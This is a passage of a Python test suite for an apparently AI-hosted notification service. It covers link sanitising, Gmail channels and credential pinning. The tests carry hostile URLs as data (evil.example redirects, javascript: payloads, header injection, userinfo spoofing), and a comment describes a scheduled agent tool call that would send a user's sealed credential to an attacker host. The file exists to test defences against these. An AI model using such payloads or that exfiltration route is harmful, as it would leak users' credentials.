        s = egress.session(trust_env=False)
        try:
            return s.trust_env
        finally:
            await s.close()
    check("egress.session forces trust_env even when a caller asks otherwise",
          asyncio.run(forced()) is True)


def test_this_hosts_reachout_address_is_its_home_address():
    """The origin a link gains is CSERIES_URL's, whatever entity asks: a
    C-Series Host has one address, scheme and port included."""
    check("resolve_host_origin is the home address, scheme and port included",
          asyncio.run(service.resolve_host_origin(ENTITY)) == HOME_ORIGIN,
          asyncio.run(service.resolve_host_origin(ENTITY)))
    check("... for any entity id",
          asyncio.run(service.resolve_host_origin(99)) == HOME_ORIGIN)
    check("a relative link gains it",
          service.doorbell_link("/?open=circles", HOME_ORIGIN) == HOME_ORIGIN + "/?open=circles")


def test_the_link_in_a_reachout_only_ever_opens_this_host():
    # doorbell_link keeps an absolute link only on exactly the origin, scheme
    # included (_on_origin); these run on https, the http home default below.
    o = "https://home.cseries.localhost"
    d = service.doorbell_link
    check("a relative link gains the host's origin",
          d("/?open=oversight&view=findings", o) == o + "/?open=oversight&view=findings")
    check("a link already on the host's origin is kept",
          d(o + "/?open=circles", o) == o + "/?open=circles")
    check("the same host on its default port is the same origin",
          d("https://home.cseries.localhost:443/x", o) == "https://home.cseries.localhost:443/x")
    for bad in ("https://evil.example/login", "//evil.example/x", "/\\evil.example",
                "javascript:alert(1)", "data:text/html,hi", "http://home.cseries.localhost/x",
                "https://home.cseries.localhost:8443/x", "https://x@home.cseries.localhost/",
                "https://home.cseries.localhost.evil.example/",
                "https://home.cseries.example/x",
                "https://sage.host.example.test/x", "/ok\nInjected: yes", ""):
        check(f"{bad!r} becomes the host's own address", d(bad, o) == o + "/", d(bad, o))
    check("with no origin a relative link still goes out as it is",
          d("/?open=circles", "") == "/?open=circles")
    check("with no origin anything else goes out as nothing",
          d("https://evil.example/x", "") == "")
    p = "https://home.cseries.localhost:8443"
    check("an origin on its own port keeps links on that port and no other",
          d(p + "/x", p) == p + "/x" and d("https://home.cseries.localhost/x", p) == p + "/"
          and d("https://home.cseries.localhost:443/x", p) == p + "/")
    h = "http://home.cseries.localhost:8800"
    check("on the http home default a link on that origin keeps its path and query",
          d(h + "/?open=circles", h) == h + "/?open=circles")
    for bad in ("https://home.cseries.localhost:8800/x", "http://home.cseries.localhost/x",
                "http://evil.example:8800/x"):
        check(f"...and {bad!r} on http becomes the host's own address", d(bad, h) == h + "/", d(bad, h))


def test_a_trigger_never_fires_for_what_came_before_it():
    """Connecting Gmail builds three triggers at once on a pod that may have run
    for a week, and the first pass after that must page nobody about the week."""
    async def run():
        pool = FakePool()
        ch = _log_channel(pool, cooldown_s=0)
        boot = T0 - timedelta(days=7)
        # No trigger yet: a pass moves the mark instead of leaving it at boot.
        before = datetime.now(timezone.utc)
        mark = await dispatcher.run_once(pool, ENTITY, boot)
        check("a pass with no trigger moves the mark to now", mark >= before, str(mark))
        # The week's rows, then a trigger created at T0, then one new row.
        for h in (150, 90, 30, 1):
            pool.add_message(event="build_finished", sent_at=T0 - timedelta(hours=h))
        _trigger(pool, ch)                       # created_at = T0
        fresh = pool.add_message(event="build_finished", sent_at=T0 + timedelta(minutes=1))
        # Even from a mark still at boot — the case the mark alone could not
        # cover — only the row after the trigger fires.
        await dispatcher.run_once(pool, ENTITY, boot)
        sent = pool.sent_rows()
        check("exactly one reach-out, for the row after the trigger",
              [r["message_id"] for r in sent] == [fresh["message_id"]],
              str([(r["message_id"], r["status"]) for r in pool.log]))
    asyncio.run(run())


def test_the_host_removes_only_what_it_created():
    async def run():
        pool = FakePool()
        _sent, restore, _rows = _stub_gmail()
        from server.reachout import defaults
        try:
            await defaults.ensure_gmail_channel(pool, ENTITY, "conn_g1")
            ch = pool.channels[0]
            for what, call in (
                    ("channel", lambda: service.remove_channel(pool, ENTITY, ch["id"], actor="host")),
                    ("trigger", lambda: service.remove_trigger(pool, ENTITY, pool.triggers[0]["id"],
                                                               actor="host"))):
                try:
                    await call()
                    check(f"the host cannot remove the platform's Gmail {what}", False, "removed")
                except service.ReachoutError as e:
                    # Whose it is, and no place to send them: the settings
                    # pane it named was never built (Circles' rail is gone).
                    check(f"the host cannot remove the platform's Gmail {what}, and says whose it is",
                          "set up when Gmail was connected" in str(e) and "the user's to remove" in str(e)
                          and "Circles →" not in str(e), str(e))
            check("both are still there", len(pool.channels) == 1 and len(pool.triggers) == 3)
            await service.remove_trigger(pool, ENTITY, pool.triggers[0]["id"], actor="user")
            await service.remove_channel(pool, ENTITY, ch["id"], actor="user")
            check("the user can remove them", pool.channels == [] and pool.triggers == [])
        finally:
            restore()
    asyncio.run(run())


def test_the_default_gmail_channel_is_built_once_with_the_designs_triggers():
    from server.reachout import defaults

    async def run():
        pool = FakePool()
        _sent, restore, rows = _stub_gmail()
        try:
            out = await defaults.ensure_gmail_channel(pool, ENTITY, "conn_g1")
            check("the default channel is built", out.get("created") is True, str(out))
            ch = pool.channels[0]
            check("it is called Your Gmail and was made by the platform",
                  ch["name"] == "Your Gmail" and ch["created_by"] == "platform", str(ch))
            got = sorted((t["match_kind"], t["match_event"]) for t in pool.triggers)
            want = sorted([("decision", None), ("system_notification", "build_finished"),
                           ("system_notification", "site_published")])
            check("with exactly the design's three email triggers", got == want, str(got))
            check("each made by the platform",
                  all(t["created_by"] == "platform" for t in pool.triggers))
            check("and the connection remembers this mailbox had one",
                  rows["conn_g1"]["connection_config"].get(defaults.DEFAULT_STAMP) == "built",
                  str(rows["conn_g1"]))
        finally:
            restore()

        # The user already owns a channel with that name: theirs is kept.
        pool = FakePool()
        _sent, restore, _rows = _stub_gmail()
        try:
            await service.add_channel(pool, ENTITY, name="Your Gmail", kind="email",
                                      action={"type": "log"}, created_by="user")
            out = await defaults.ensure_gmail_channel(pool, ENTITY, "conn_g1")
            check("a name the user already took gets the masked address instead",
                  out.get("channel") == "Your Gmail (o•••@mail.example.net)", str(out))
            check("and the user's own channel is untouched",
                  pool.channels[0]["name"] == "Your Gmail"
                  and pool.channels[0]["action"] == {"type": "log"})
        finally:
            restore()
    asyncio.run(run())


def test_reconnecting_moves_the_channel_and_never_builds_a_second():
    """The replay, run for real: every consent mints a NEW connection
    id, the old one is left marked for re-auth, and reconnecting is the fix the
    user is told to apply. Three reconnects later there must still be ONE
    channel, on the newest connection, and one event must send ONE mail
    through it."""
    from server.reachout import defaults

    async def run():
        pool = FakePool()
        tokens = {"conn_a": "tok-a", "conn_b": "tok-b", "conn_c": "tok-c", "conn_d": "tok-d"}
        sent, restore, rows = _stub_gmail(conns=[_gconn("conn_a")], token=tokens)
        try:
            await defaults.ensure_gmail_channel(pool, ENTITY, "conn_a")
            # The host built one of its own on the same mailbox, too.
            await service.add_channel(pool, ENTITY, name="Builds only", kind="email",
                                      action={"type": "gmail_send", "connection_id": "conn_a"})
            for old, new in (("conn_a", "conn_b"), ("conn_b", "conn_c"), ("conn_c", "conn_d")):
                rows[old]["status"] = "needs_reauth"      # the sign-in expired
                rows[new] = _gconn(new)                    # the user reconnected
                out = await defaults.ensure_gmail_channel(pool, ENTITY, new)
                check(f"reconnect {new}: nothing new is built", out.get("created") is False, str(out))
                pinned = sorted(c["action"].get("connection_id") for c in pool.channels)
                check(f"reconnect {new}: BOTH channels of the mailbox moved to it",
                      pinned == [new, new], str(pinned))
            check("still exactly two channels and three triggers",
                  len(pool.channels) == 2 and len(pool.triggers) == 3,
                  str([c["name"] for c in pool.channels]))
            m = pool.add_message(kind="decision", event=None, subject="Pick a colour",
                                 link="/?open=circles&view=decision:4")
            await dispatcher.run_once(pool, ENTITY, T0 - timedelta(seconds=1))
            check("one decision sends ONE mail", len(sent) == 1, str(sent))
            check("through the newest connection", sent and sent[0]["token"] == "tok-d", str(sent))
            check("and no row says to reconnect", not any(
                "reconnect" in str(r["detail"].get("error") or "") for r in pool.log), str(pool.log))
            _ = m
        finally:
            restore()
    asyncio.run(run())


def test_a_removed_default_is_not_rebuilt_on_reconnect():
    from server.reachout import defaults

    async def run():
        pool = FakePool()
        _sent, restore, rows = _stub_gmail(conns=[_gconn("conn_a")])
        try:
            await defaults.ensure_gmail_channel(pool, ENTITY, "conn_a")
            await service.remove_channel(pool, ENTITY, "Your Gmail", actor="user")
            rows["conn_a"]["status"] = "needs_reauth"
            rows["conn_b"] = _gconn("conn_b")
            out = await defaults.ensure_gmail_channel(pool, ENTITY, "conn_b")
            check("a default the user removed is not rebuilt by a reconnect",
                  out.get("created") is False and pool.channels == [], str(out))
            check("and the new connection carries the memory forward",
                  rows["conn_b"]["connection_config"].get(defaults.DEFAULT_STAMP) == "built")
        finally:
            restore()
    asyncio.run(run())


def test_every_mailbox_gets_a_channel_and_a_taken_name_is_never_silent():
    """Three mailboxes that mask identically (same first letter, same domain),
    and a name taken between the read and the insert."""
    from server.reachout import defaults

    async def run():
        pool = FakePool()
        addrs = {"conn_1": "alex@example.net", "conn_2": "jo@example.org",
                 "conn_3": "lee@example.org"}
        _sent, restore, _rows = _stub_gmail(conns=[_gconn(c, a) for c, a in addrs.items()])
        try:
            for cid in addrs:
                out = await defaults.ensure_gmail_channel(pool, ENTITY, cid)
                check(f"{cid} gets its own channel", out.get("created") is True, str(out))
            names = [c["name"] for c in pool.channels]
            check("three channels under three distinct names", len(set(names)) == 3, str(names))
        finally:
            restore()

        # The name list was read, then someone took "Your Gmail" before the insert.
        class RacingPool(FakePool):
            async def fetch(self, sql, *p):
                if " ".join(sql.split()).startswith("SELECT name FROM reachout_channels"):
                    return []
                return await super().fetch(sql, *p)
        pool = RacingPool()
        _sent, restore, _rows = _stub_gmail()
        try:
            _log_channel(pool, name="Your Gmail")
            out = await defaults.ensure_gmail_channel(pool, ENTITY, "conn_g1")
            check("a name lost to a race moves on to the next",
                  out.get("channel") == "Your Gmail (o•••@mail.example.net)", str(out))
        finally:
            restore()

        # Two connects of ONE mailbox at once: the other built this mailbox's
        # default between our read and our insert. Ours must not build a second.
        pool = RacingPool()
        _sent, restore, rows = _stub_gmail(conns=[_gconn("conn_g1"), _gconn("conn_g2")])
        try:
            pool.channels.append({
                "id": pool._next("channel"), "entity_id": ENTITY, "name": "Your Gmail",
                "kind": "email", "action": {"type": "gmail_send", "connection_id": "conn_g2"},
                "cooldown_s": 120, "quiet_from": None, "quiet_to": None, "quiet_tz": None,
                "created_by": "platform", "created_at": T0, "disabled_at": None})

            # The concurrent build lands after our scan of channels, before our insert.
            real_scan = defaults._gmail_channels
            scans = {"n": 0}

            async def late_scan(pool_, eid):
                scans["n"] += 1
                got = await real_scan(pool_, eid)
                return [] if scans["n"] == 1 else got
            defaults._gmail_channels = late_scan
            try:
                out = await defaults.ensure_gmail_channel(pool, ENTITY, "conn_g1")
            finally:
                defaults._gmail_channels = real_scan
            check("a concurrent connect of the same mailbox does not build a second default",
                  out.get("created") is False and len(pool.channels) == 1, str(out))
        finally:
            restore()

        # A default that fails part-way is removed, not left half-built.
        pool = FakePool()
        _sent, restore, _rows = _stub_gmail()
        real_add = service.add_trigger
        made = {"n": 0}

        async def flaky_add(*a, **k):
            made["n"] += 1
            if made["n"] == 2:
                raise RuntimeError("database went away mid-build")
            return await real_add(*a, **k)
        service.add_trigger = flaky_add
        try:
            try:
                await defaults.ensure_gmail_channel(pool, ENTITY, "conn_g1")
                check("a build that fails part-way raises", False, "returned")
            except RuntimeError:
                check("a build that fails part-way raises", True)
            check("and leaves no half-built channel or orphan trigger behind",
                  pool.channels == [] and pool.triggers == [], (pool.channels, pool.triggers))
            service.add_trigger = real_add
            out = await defaults.ensure_gmail_channel(pool, ENTITY, "conn_g1")
            check("so the next connect builds it whole",
                  out.get("created") is True and len(pool.triggers) == 3, str(out))
        finally:
            service.add_trigger = real_add
            restore()
    asyncio.run(run())


def test_the_connect_hook_builds_the_channel_and_never_fails_the_connect():
    from server import brain_service
    from server.integrations.providers import _google_base as g
    from server.integrations.providers import gmail as gmail_provider
    from server.reachout import defaults

    async def run():
        calls, notices = [], []
        real_cb, real_ensure = g.handle_callback, defaults.ensure_gmail_channel
        real_pool, real_eid = brain_service._pool, brain_service._entity_id
        # The hook imports the writer at call time, so the stub goes where that
        # import looks — sys.modules — the way the missing-table test does it.
        # Patching an attribute on whatever module object this test happens to
        # import is not enough: an earlier test pops the entry, and the hook's
        # import then loads a fresh copy nobody patched.
        real_mh = sys.modules.get("server.bridge.memory_handlers")
        memory_handlers = types.ModuleType("server.bridge.memory_handlers")
        sys.modules["server.bridge.memory_handlers"] = memory_handlers

        async def ok_cb(*a, **k):
            return {"ok": True, "connection_id": "conn_g9", "account_email": GMAIL_ADDR}

        async def ensure(pool, eid, cid):
            calls.append((eid, cid))
            return {"created": True}

        async def boom(pool, eid, cid):
            raise RuntimeError("the pod database went away")

        async def append(msg):
            notices.append(msg)
            return {"ok": True}

        g.handle_callback = ok_cb
        memory_handlers.handle_inbox_append = append
        brain_service._pool, brain_service._entity_id = FakePool(), ENTITY
        # The advice in the notice depends on the connection, so the store is
        # stubbed — never this box's real integrations database.
        _sent, restore_store, rows = _stub_gmail(conns=[_gconn("conn_g9")])
        try:
            defaults.ensure_gmail_channel = ensure
            res = await gmail_provider.handle_callback("code", "state", "https://x")
            check("a successful connect builds the default channel for THAT connection",
                  res.get("ok") and calls == [(ENTITY, "conn_g9")], str(calls))
            check("and says nothing when it worked", notices == [], str(notices))
            defaults.ensure_gmail_channel = boom
            try:
                res = await gmail_provider.handle_callback("code", "state", "https://x")
            except Exception as e:  # noqa: BLE001 — the failure under test
                res = {"ok": False, "raised": repr(e)}
            check("a failure to build it never fails the connection", res.get("ok") is True,
                  str(res))
            check("and is never silent: the user's inbox says why",
                  len(notices) == 1 and "went away" in notices[0]["body"]
                  and notices[0]["payload"]["event"] == "reachout_channel_failed", str(notices))
            check("a usable connection is told the Host can build it",
                  notices and "Ask your Host" in notices[0]["body"], str(notices))
            rows["conn_g9"]["connection_config"] = {}      # no account address recorded
            await gmail_provider.handle_callback("code", "state", "https://x")
            check("a connection that cannot carry email is told to reconnect, not to ask the Host",
                  len(notices) == 2 and "connect Gmail again" in notices[1]["body"]
                  and "Ask your Host" not in notices[1]["body"], str(notices[1:]))
        finally:
            restore_store()
            g.handle_callback, defaults.ensure_gmail_channel = real_cb, real_ensure
            if real_mh is None:
                sys.modules.pop("server.bridge.memory_handlers", None)
            else:
                sys.modules["server.bridge.memory_handlers"] = real_mh
            brain_service._pool, brain_service._entity_id = real_pool, real_eid
    asyncio.run(run())


def test_the_deep_link_contract():
    from server.deep_link import app_link
    check("app_link writes the query form",
          app_link("oversight", "findings") == "/?open=oversight&view=findings")
    check("a view keeps its colon readable", app_link("workbench", "project:7")
          == "/?open=workbench&view=project:7")
    check("a '+' in a view is encoded, so the reader cannot take it for a space",
          app_link("circles", "a+b c") == "/?open=circles&view=a%2Bb%20c")
    for bad in ("", "Circles", "../x", "a" * 65, "-x"):
        try:
            app_link(bad)
            check(f"{bad!r} is refused as an app id", False, "accepted")
        except ValueError:
            check(f"{bad!r} is refused as an app id", True)

    # Every writer uses it: no fragment-shaped or legacy link left in a payload.
    legacy = re.compile(r"""["']/#(open=|circles|workbench)""")
    offenders = []
    for base in ("server", "brain"):
        for dirpath, _d, files in os.walk(os.path.join(_ROOT, base)):
            for fn in files:
                if fn.endswith(".py"):
                    path = os.path.join(dirpath, fn)
                    with open(path, encoding="utf-8") as fh:
                        if legacy.search(fh.read()):
                            offenders.append(os.path.relpath(path, _ROOT))
    check("no writer carries a fragment or legacy link", offenders == [], str(offenders))

    html = _read("dashboard/base/index.html")
    check("the shell loads the reader after AppRunner exists",
          html.index("/js/app-runner.js") < html.index("/js/deep-link.js"))


_DEEP_LINK_HARNESS = r"""
const fs = require('fs');
const src = fs.readFileSync(process.argv[2], 'utf8');
function run(search, hash) {
  const launched = [], replaced = [], listeners = {};
  global.window = {
    location: { search, hash, pathname: '/' },
    AppRunner: { launch: (id, opts) => launched.push([id, opts || null]) },
  };
  global.document = { addEventListener: (t, f) => { listeners[t] = f; } };
  global.history = { replaceState: (_s, _t, url) => replaced.push(url) };
  eval(src);
  if (listeners['desktop:restored']) listeners['desktop:restored']();
  return { launched, replaced };
}
console.log(JSON.stringify({
  ok: run('?open=oversight&view=finding%3A12&x=1', '#keep'),
  plus: run('?open=circles&view=a%2Bb', ''),
  bad: run('?open=Bad_Id&view=x', ''),
  long: run('?open=' + 'a'.repeat(64), ''),
  none: run('', ''),
}));
"""


def test_the_shell_reader_opens_the_app_once():
    """deep-link.js itself, run in node against a stub window."""
    import shutil
    import subprocess
    import tempfile
    if not shutil.which("node"):
        print("  SKIP deep-link.js behaviour: no node on this machine")
        return
    with tempfile.NamedTemporaryFile("w", suffix=".js", delete=False) as fh:
        fh.write(_DEEP_LINK_HARNESS)
        harness = fh.name
    try:
        out = subprocess.run(["node", harness, os.path.join(_ROOT, "dashboard/base/js/deep-link.js")],
                             capture_output=True, text=True, timeout=30)
    finally:
        os.unlink(harness)
    try:
        r = json.loads(out.stdout)
    except Exception:
        check("the node harness ran", False, out.stderr[-800:])
        return
    check("a link opens its app with its view, decoded",
          r["ok"]["launched"] == [["oversight", {"view": "finding:12"}]], str(r["ok"]))
    check("the link is consumed first, keeping the rest of the address",
          r["ok"]["replaced"] == ["/?x=1#keep"], str(r["ok"]))
    check("a %2B arrives as '+', not as a space",
          r["plus"]["launched"] == [["circles", {"view": "a+b"}]], str(r["plus"]))
    check("an id the manifest rule refuses opens nothing", r["bad"]["launched"] == [], str(r["bad"]))
    check("a 64-character id, which the manifest allows, opens",
          r["long"]["launched"] == [["a" * 64, None]], str(r["long"]))
    check("no link, no launch and no history write",
          r["none"] == {"launched": [], "replaced": []}, str(r["none"]))


_POST_VIEW_HARNESS = r"""
const fs = require('fs');
const src = fs.readFileSync(process.argv[2], 'utf8');
const m = src.match(/function postView\(iframe, view\) \{[\s\S]*?\n    \}\n/);
if (!m) { console.log(JSON.stringify({ found: false })); process.exit(0); }
global.window = { location: { href: 'https://h.example/' } };
const postView = eval('(' + m[0].trim() + ')');
function frame(loaded) {
  const posted = [], listeners = {};
  return {
    src: 'https://h.example/system-apps/x/', dataset: loaded ? { loaded: '1' } : {},
    contentWindow: { postMessage: (msg, origin) => posted.push([msg, origin]) },
    addEventListener: (t, f) => { listeners[t] = f; },
    posted, listeners,
  };
}
const up = frame(true); postView(up, 'finding:3');
const loading = frame(false); postView(loading, 'finding:4');
const before = loading.posted.length;
if (loading.listeners.load) loading.listeners.load();
console.log(JSON.stringify({ found: true, up: up.posted, before, after: loading.posted }));
"""


def test_a_view_sent_to_a_loading_window_waits_for_it():
    """app-runner's postView, run in node: a window desktop-restore opened a
    moment ago is 'already open' to a deep link while its frame still loads."""
    import shutil
    import subprocess
    import tempfile
    if not shutil.which("node"):
        print("  SKIP postView behaviour: no node on this machine")
        return
    with tempfile.NamedTemporaryFile("w", suffix=".js", delete=False) as fh:
        fh.write(_POST_VIEW_HARNESS)
        harness = fh.name
    try:
        out = subprocess.run(["node", harness, os.path.join(_ROOT, "dashboard/base/js/app-runner.js")],
                             capture_output=True, text=True, timeout=30)
    finally:
        os.unlink(harness)
    try:
        r = json.loads(out.stdout)
    except Exception:
        check("the node harness ran", False, out.stderr[-800:])
        return
    check("app-runner has postView", r.get("found") is True, out.stdout)
    view = {"type": "cseries:app-view", "view": "finding:3"}
    check("a loaded frame gets the view at once, on its own origin",
          r.get("up") == [[view, "https://h.example"]], str(r.get("up")))
    check("a loading frame gets nothing yet", r.get("before") == 0, str(r))
    check("and gets it on its load",
          r.get("after") == [[{"type": "cseries:app-view", "view": "finding:4"}, "https://h.example"]],
          str(r.get("after")))
    src = _read("dashboard/base/js/app-runner.js")
    check("the already-open branch sends through postView",
          "postView(document.querySelector(" in src)
    check("and every frame marks itself loaded",
          "iframe.dataset.loaded = '1'" in src)


# ── 6b. THE HTTP TRANSPORT, AGAINST A FAKE BROKER ─────────────────────────

def test_http_call_goes_through_the_vault_broker_and_carries_no_secret():
    async def run():
        pool = FakePool()
        calls: list[dict] = []

        async def fake_use_credential(pool_, *, entity_id, name, action, request=None,
                                      actor=None):
            calls.append({"name": name, "action": action, "request": request})
            return {"status": 200, "body": "ok", "json": None}

        authz = types.ModuleType("server.vault.authz")
        authz.use_credential = fake_use_credential
        sys.modules["server.vault.authz"] = authz

        ch = {"id": 1, "name": "pager", "kind": "webhook", "cooldown_s": 0,
              "quiet_from": None, "quiet_to": None, "quiet_tz": None,
              "action": {"type": "http_call", "cred_name": "twilio",
                         "url": "https://api.test/send",
                         "pinned_origin": "https://api.test:443",
                         "pinned_host": "api.test",
                         "method": "POST", "auth_scheme": "basic",
                         "form": {"To": "{{user.phone}}",
                                  "Body": "{{msg.subject}} — {{msg.link}}"},
                         "vars": {"phone": "+15551234567"}}}
        pool.channels.append({**ch, "entity_id": ENTITY, "created_by": "host",
                              "created_at": T0, "disabled_at": None})
        msg = {"message_id": uuid.uuid4(), "subject": "Build finished: x",
               "message_kind": "system_notification",
               "payload": {"event": "build_finished", "link": "/#w/7"}}

        res = await service.fire(pool, ENTITY, channel=ch, message=msg,
                                 trigger_id=1, now=T0)
        check("the brokered call was made", len(calls) == 1, calls)
        check("through the credential's NAME, never its bytes",
              calls and calls[0]["name"] == "twilio"
              and "secret" not in json.dumps(calls[0]["request"]).lower(),
              calls)
        check("the templates rendered into the form body",
              calls and calls[0]["request"]["body"] == {
                  "To": "+15551234567", "Body": "Build finished: x — /#w/7"},
              calls[0]["request"] if calls else None)
        check("and the outcome is 'sent'", res["status"] == "sent", res)
        check("the log row keeps status + cred name + host, not the response body",
              res["detail"] == {"transport": "http_call", "cred_name": "twilio",
                                "status": 200, "host": "api.test"}, res["detail"])
        check("redirects are refused on the wire, so the pin cannot be undone",
              calls and calls[0]["request"]["allow_redirects"] is False,
              calls[0]["request"] if calls else None)

        # A non-2xx is a FAILURE, and it is not retried: the log row is
        # already consumed by the idempotency gate.
        async def refusing(pool_, **kw):
            return {"status": 503, "body": "down"}
        authz.use_credential = refusing
        msg2 = {**msg, "message_id": uuid.uuid4()}
        res2 = await service.fire(pool, ENTITY, channel=ch, message=msg2,
                                  trigger_id=1, now=T0)
        check("a refusing endpoint lands as failed", res2["status"] == "failed", res2)
        res3 = await service.fire(pool, ENTITY, channel=ch, message=msg2,
                                  trigger_id=1, now=T0)
        check("and is never retried", res3["status"] is None, res3)
        sys.modules.pop("server.vault.authz", None)
    asyncio.run(run())


# ── 6c. THE WIDEN WALL ────────────────────────────────────────────────────
#
# The hole: `reachout` was in DIRECT_OP_TOOLS and UNATTENDED_OP_TOOLS
# with add_channel on it, so
#   schedule_task(op_tool='reachout', op_args={op:'add_channel', action:
#     {type:'http_call', cred_name:<any live cred>, url:'https://attacker/'}})
# followed by a test fire would post one of the user's sealed credentials to an
# arbitrary host, at 03:00, with nobody there. Three separate things below have
# to hold for that to be closed, and each is tested on its own so that fixing
# one and losing another cannot read as green.

def test_building_a_channel_is_not_reachable_from_the_unattended_lane():
    # reachout_channel is the Host's own operate op (the Host calls an agent only for untrusted work; building a channel to
    # its own person is in-platform). The wall against the 03:00 widen was
    # never DIRECT_OP_TOOLS membership: it is UNATTENDED_OP_TOOLS, which the
    # offline runner checks before run_direct_op is reached, plus the user's
    # step-up code in service.add_channel (the next test).
    from mastercode.runtime.direct_ops import (
        DIRECT_OP_TOOLS, UNATTENDED_OP_TOOLS, is_unattended_op_tool)
    check("reachout_channel runs in the Host's own turn (operate)",
          "reachout_channel" in DIRECT_OP_TOOLS)
    check("and is NOT schedulable",
          "reachout_channel" not in UNATTENDED_OP_TOOLS
          and not is_unattended_op_tool("reachout_channel"))
    # The scheduler's own guard is the door a scheduled op_tool comes through.
    # Driven, not read: a scheduled add_channel never reaches run_direct_op.
    async def run():
        import mastercode.brain.offline_task_runner as runner
        ok, content, err = await runner._run_op(
            FakePool(), ENTITY, "reachout_channel",
            {"name": "x", "action": {"type": "http_call", "cred_name": "twilio",
                                      "url": "https://attacker.test/"}})
        check("the scheduler refuses a scheduled channel build", ok is False, err)
        check("and the refusal is the unattended wall",
              "UnattendedOpRefused" in (err or ""), err)
    asyncio.run(run())
    # And the op is genuinely gone from the schedulable tool.
    from mastercode.public_tool_registry import PUBLIC_TOOL_SCHEMAS as P
    ops = (P["reachout"]["function"]["parameters"]["properties"]["op"]["enum"])
    check("add_channel is not an op on the unattended tool",
          "add_channel" not in ops, ops)


def test_binding_a_credential_to_a_destination_needs_the_user():
    async def run():
        pool = FakePool()
        used = _stub_vault_and_stepup(pool)
        action = {"type": "http_call", "cred_name": "twilio",
                  "url": "https://api.test/send", "auth_scheme": "bearer"}

        try:
            await service.add_channel(pool, ENTITY, name="p1", kind="webhook",
                                      action=dict(action))
            check("an http_call channel without a step-up code is refused",
                  False, "it was created")
        except service.ReachoutError as e:
            check("an http_call channel without a step-up code is refused",
                  "authenticator" in str(e), str(e))
        check("and nothing was written", pool.channels == [])

        try:
            await service.add_channel(pool, ENTITY, name="p1", kind="webhook",
                                      action=dict(action), stepup_code="000000")
            check("a WRONG code is refused", False, "it was created")
        except service.ReachoutError:
            check("a WRONG code is refused", True)

        row = await service.add_channel(pool, ENTITY, name="p1", kind="webhook",
                                        action=dict(action), stepup_code=CODE)
        check("the right code builds it", row["name"] == "p1", row)
        check("and the result says WHAT was pinned, derived not echoed",
              row.get("pinned_host") == "api.test"
              and row.get("pinned_origin") == "https://api.test:443", row)

        # The verifier BURNS the code, so the same one cannot build a second
        # channel. This is the property that makes a stored payload useless.
        try:
            await service.add_channel(pool, ENTITY, name="p2", kind="webhook",
                                      action=dict(action), stepup_code=CODE)
            check("a REPLAYED code is refused", False, "it was created")
        except service.ReachoutError:
            check("a REPLAYED code is refused", True)

        # A channel that carries no credential asks the user for nothing.
        r = await service.add_channel(pool, ENTITY, name="quiet-one", kind="log",
                                      action={"type": "log"})
        check("a log channel needs no code", r["name"] == "quiet-one", r)
        r = await service.add_channel(pool, ENTITY, name="rb", kind="runbook",
                                      action={"type": "runbook", "template_id": 12})
        check("a runbook channel needs no code", r["name"] == "rb", r)
        check("only http_call is treated as a widen",
              service.action_needs_stepup({"type": "http_call"})
              and not service.action_needs_stepup({"type": "log"})
              and not service.action_needs_stepup({"type": "runbook"}))
        check("the shared verifier was the one asked", CODE in used, used)
    asyncio.run(run())


def test_the_destination_is_pinned_and_cannot_move():
    async def run():
        pool = FakePool()
        _stub_vault_and_stepup(pool, codes_ok=("111111", "222222", "333333"))

        try:
            await service.add_channel(
                pool, ENTITY, name="plain", kind="webhook", stepup_code="111111",
                action={"type": "http_call", "cred_name": "twilio",
                        "url": "http://api.test/send"})
            check("an http url is refused", False, "it was created")
        except service.ReachoutError as e:
            check("an http url is refused", "https" in str(e), str(e))

        row = await service.add_channel(
            pool, ENTITY, name="pinned", kind="webhook", stepup_code="222222",
            action={"type": "http_call", "cred_name": "twilio",
                    "url": "https://api.test/send/{{user.path}}",
                    "vars": {"path": "abc"}})
        stored = next(c for c in pool.channels if c["name"] == "pinned")
        check("the destination is recorded on the channel at creation",
              stored["action"]["pinned_origin"] == "https://api.test:443"
              and stored["action"]["pinned_host"] == "api.test",
              stored["action"])

        # THE READABLE-BUT-LYING URL. `https://api.good.com@evil.com/send`
        # pins evil.com and reads as api.good.com, so a user could type their
        # authenticator code against a destination the host narrated and a
        # different one entirely would be authorised. Two independent defences,
        # tested separately because either alone can regress.
        try:
            await service.add_channel(
                pool, ENTITY, name="lying", kind="webhook", stepup_code="444444",
                action={"type": "http_call", "cred_name": "twilio",
                        "url": "https://api.good.com@evil.com/send"})
            check("a url with userinfo before the host is refused", False,
                  "it was created")
        except service.ReachoutError as e:
            check("a url with userinfo before the host is refused",
                  "before the host" in str(e), str(e))
        check("no channel, and no code spent on it",
              not any(c["name"] == "lying" for c in pool.channels))

        # And the step-up refusal itself names the destination the PLATFORM
        # derived — so even for a shape nobody enumerated, the sentence the
        # user reads comes from the same parse that produces the pin.
        try:
            await service.add_channel(
                pool, ENTITY, name="named", kind="webhook",
                action={"type": "http_call", "cred_name": "twilio",
                        "url": "https://provider.test:8443/send"})
            check("the step-up refusal names the derived destination", False,
                  "it was created")
        except service.ReachoutError as e:
            msg_ = str(e)
            check("the step-up refusal names the derived destination",
                  "provider.test:8443" in msg_, msg_)
            check("…and names the credential it would send",
                  "twilio" in msg_, msg_)

        # A credential this host does not hold is still refused, and the
        # step-up does not paper over it.
        try:
            await service.add_channel(
                pool, ENTITY, name="ghost", kind="webhook", stepup_code="333333",
                action={"type": "http_call", "cred_name": "not-a-key",
                        "url": "https://api.test/send"})
            check("an unknown credential is refused", False, "it was created")
        except service.ReachoutError as e:
            check("an unknown credential is refused", "no active credential" in str(e))

        # Fire time: the url is a TEMPLATE, so the string validated and the
        # string called are not the same. A render that moves the host does
        # not go.
        calls = []

        async def fake_use_credential(pool_, **kw):
            calls.append(kw)
            return {"status": 200, "body": "ok"}
        authz = types.ModuleType("server.vault.authz")
        authz.use_credential = fake_use_credential
        sys.modules["server.vault.authz"] = authz

        moved = {**stored, "cooldown_s": 0,
                 "action": {**stored["action"],
                            "url": "https://{{user.host}}/send",
                            "vars": {"host": "attacker.example"}}}
        msg = {"message_id": uuid.uuid4(), "subject": "s",
               "message_kind": "system_notification", "payload": {"link": "/l"}}
        res = await service.fire(pool, ENTITY, channel=moved, message=msg,
                                 trigger_id=None, now=T0)
        check("a fire to a host other than the pinned one is refused",
              res["status"] == "failed" and "may only reach api.test" in
              res["detail"].get("error", ""), res["detail"])
        check("and no brokered call was made at all", calls == [], calls)

        # THE PORT IS PART OF THE PIN. Hostname-only was the first cut, and a
        # templated port renders straight past it — same machine, different
        # service, and the credential goes to the one the user never approved.
        ported = {**stored, "cooldown_s": 0,
                  "action": {**stored["action"],
                             "url": "https://api.test:{{user.port}}/send",
